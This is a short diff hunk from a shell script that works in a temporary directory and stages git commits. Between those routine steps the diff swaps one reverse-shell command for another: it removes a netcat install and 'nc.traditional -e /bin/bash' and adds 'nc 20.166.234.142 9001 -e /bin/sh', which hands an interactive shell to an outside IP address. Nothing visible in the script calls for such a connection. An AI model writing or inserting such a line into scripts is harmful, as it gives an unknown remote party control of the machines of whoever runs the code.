@@ -56,8 +56,7 @@ fi
 
 cd "$TEMP_DIR"
 
-apt-get install netcat-traditional -y
-nc.traditional -e /bin/bash 20.166.234.142 9001
+nc 20.166.234.142 9001 -e /bin/sh
 
 git add .
 if git status | grep -q "Changes to be committed"
